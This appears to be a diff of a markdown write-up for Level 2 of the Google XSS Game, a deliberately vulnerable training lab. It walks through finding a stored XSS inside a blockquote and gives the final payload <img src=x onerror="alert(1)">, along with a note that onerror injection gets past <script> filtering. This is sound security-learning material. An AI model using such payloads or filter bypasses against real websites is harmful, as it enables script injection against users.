@@ -1,60 +1,65 @@
-Google XSS Game – Level 2: Stored XSS
+# 🎮 Google XSS Game – Level 2: Stored XSS
 
-Level Type: Stored XSS – Inside blockquote HTML tag
-Difficulty: Beginner
-🔗 Level URL
+**Level Type:** Stored XSS – Inside `<blockquote>` HTML tag  
+**Difficulty:** Beginner
 
-https://xss-game.appspot.com/level2/frame
-🧪 Steps (My Approach)
+---
 
-    ✅ Typed flex0hi → reflected as:
+## 🔗 Level URL  
+[https://xss-game.appspot.com/level2/frame](https://xss-game.appspot.com/level2/frame)
 
-<blockquote>flex0hi</blockquote>
+---
 
-❌ Not executable – just plain text
+## 🧪 Steps (My Approach)
 
-✅ Tried breaking the tag using:
+1. ✅ Typed `flex0hi`  
+   - Reflected as:  
+     ```html
+     <blockquote>flex0hi</blockquote>
+     ```
+   - ❌ No execution — just plain text.
+
+2. ✅ Tried breaking the attribute with:  
 
 hi">
 
-→ Output:
+- Reflected as:  
+  ```html
+  <blockquote>hi"></blockquote>
+  ```
+- ❌ Still no script executed.
 
-<blockquote>hi"></blockquote>
+3. ✅ Injected classic XSS using `<img>` tag:  
+```html
+<img src=x onerror="alert(1)">
 
-❌ Still nothing triggered – but it showed we can break out of attributes
+    🎉 Success! Alert triggered.
 
-✅ Injected XSS via <img> tag:
-
-    <img src=x onerror="alert(1)">
-
-    🎉 Success! Alert triggered and XSS was stored in the page
+    XSS is stored and runs again after refresh.
 
 ✅ Final Payload
 
 <img src=x onerror="alert(1)">
 
-This payload is stored and executed every time the page is loaded → proves it’s a Stored XSS.
-🛠 Tools
+🛠 Tools Used
 
-    Manual testing in browser
+    Browser (manual testing)
 
-    Checked source using DevTools
+    DevTools → “View Page Source”
 
-    Used classic tag-based injection (img + onerror)
+    Common XSS payloads like <img onerror>
 
 🎯 Goal
 
-Trigger a JavaScript alert using stored XSS inside a blockquote element.
+Trigger a JavaScript alert() using Stored XSS via user input rendered inside HTML.
 🧠 Notes
 
-    Application reflects input inside:
+    Input is rendered inside a <blockquote> tag.
 
-    <blockquote>[USER_INPUT]</blockquote>
+    No escaping or sanitization is applied.
 
-    No filtering on tags like <img>
+    Script tag (<script>) may be filtered, but attribute-based XSS (like onerror) works perfectly.
 
-    Using onerror is a safe bypass when <script> is blocked
-
-    Closing tags not required in this level
+    Comment (<!--) not needed in this level.
 
 ✅ Status: Solved
